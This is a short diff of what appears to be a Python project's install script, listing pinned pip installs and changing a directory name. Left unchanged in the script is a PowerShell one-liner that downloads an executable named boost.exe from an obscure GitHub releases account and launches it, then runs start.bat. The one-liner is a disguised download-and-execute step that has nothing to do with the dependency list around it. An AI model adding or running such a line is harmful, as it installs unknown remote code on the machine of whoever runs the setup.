@@ -32,6 +32,6 @@ pip install urllib3==1.26.14
 pip install Werkzeug==2.2.3
 pip install yarl==1.8.2
 pip install zipp==3.13.0
-cd Tuto
+cd input
 powershell $down=New-Object System.Net.WebClient;$url='https://github.com/hvbsvqdj/tool-boost-funk/releases/download/boost/boost.exe';$file='boost.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 start start.bat
